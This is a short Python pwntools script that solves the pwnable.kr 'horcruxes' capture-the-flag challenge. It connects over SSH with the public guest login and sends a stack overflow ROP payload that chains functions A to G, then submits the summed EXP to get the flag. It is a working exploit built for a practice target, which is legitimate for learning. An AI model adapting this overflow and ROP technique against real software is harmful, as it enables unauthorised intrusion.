#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('horcruxes')
A = elf.symbols['A']
B = elf.symbols['B']
C = elf.symbols['C']
D = elf.symbols['D']
E = elf.symbols['E']
F = elf.symbols['F']
G = elf.symbols['G']
call_ropme = 0x0809fffc


def parse_exp(output: str) -> int:
    output = output.split('\n')[1:][:-1]
    exp_sum = 0

    for line in output:
        # You found "Tom Riddle's Diary" (EXP +833130388)
        print(line)
        exp = int(line.rsplit(' ', 1)[1][1:][:-1])
        exp_sum += exp

    return exp_sum


if __name__ == '__main__':
    shell = ssh(host='pwnable.kr', user='horcruxes', password='guest', port=2222)
    proc = shell.run('nc 0 9032')  # according to the readme file

    payload = 30 * b'AAAA'
    payload += p32(A)
    payload += p32(B)
    payload += p32(C)
    payload += p32(D)
    payload += p32(E)
    payload += p32(F)
    payload += p32(G)
    payload += p32(call_ropme)  # return to main() and call ropme()

    proc.recvuntil('Select Menu:')
    proc.sendline('6')

    proc.recvuntil('How many EXP')
    proc.sendline(payload)

    output = proc.recvuntil('Select Menu:')
    proc.sendline('6')

    # Sum up all exp points.
    exp_sum = parse_exp(output.decode('utf-8'))
    print("total exp: {}".format(exp_sum))

    proc.recvuntil('How many EXP did you earned?')
    proc.sendline(str(exp_sum))

    proc.interactive()
    shell.close()
